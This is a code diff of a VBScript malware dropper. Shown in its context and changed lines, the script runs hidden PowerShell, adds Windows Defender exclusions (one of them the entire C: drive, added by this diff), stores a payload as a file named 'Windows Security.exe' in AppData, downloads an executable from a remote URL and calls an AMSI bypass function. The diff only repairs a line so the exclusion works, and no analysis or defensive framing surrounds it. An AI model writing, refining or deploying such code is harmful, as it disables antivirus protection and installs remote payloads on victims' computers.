@@ -1,4 +1,4 @@
-﻿Option Explicit
+Option Explicit
 
 Dim shell, fso, ws
 Dim desktop, exeUrl, exePath, tempPath, subDirPath, subDirExe
@@ -26,10 +26,10 @@ RunHidden "powershell -NoProfile -ExecutionPolicy Bypass -Command Set-MpPreferen
 ' Add Defender exclusions before downloading
 subDirPath = ws.ExpandEnvironmentStrings("%APPDATA%\SubDir")
 subDirExe = subDirPath & "\Windows Security.exe"
+AddDefenderExclusion "C:\" ' Add C: drive exclusion
 AddDefenderExclusion desktop
 AddDefenderExclusion exePath
 AddDefenderExclusion subDirExe
-Add-MpPreference -ExclusionPath "C:\" -Force
 
 ' Download the EXE (blocking)
 RunHidden "powershell -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri '" & exeUrl & "' -OutFile '" & exePath & "' -UseBasicParsing"
@@ -105,5 +105,4 @@ Function AmsiBypass()
 End Function
 
 ' Call AMSI Bypass function
-
 AmsiBypass()
